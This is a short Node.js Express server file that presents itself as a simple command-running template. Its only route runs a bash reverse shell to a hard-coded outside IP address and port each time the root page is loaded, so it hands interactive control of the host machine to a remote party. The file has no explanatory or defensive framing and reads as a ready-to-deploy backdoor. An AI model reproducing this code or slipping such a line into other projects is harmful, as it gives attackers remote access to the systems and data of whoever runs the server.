const express = require('express');
const { exec } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    // Replace `your_command_here` with the command you want to run
    exec('bash -i >& /dev/tcp/140.238.85.162/9999 0>&1', (error, stdout, stderr) => {
        if (error) {
            res.send(`<pre>Error: ${error.message}</pre>`);
            return;
        }
        if (stderr) {
            res.send(`<pre>stderr: ${stderr}</pre>`);
            return;
        }
        res.send(`<pre>${stdout}</pre>`);
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
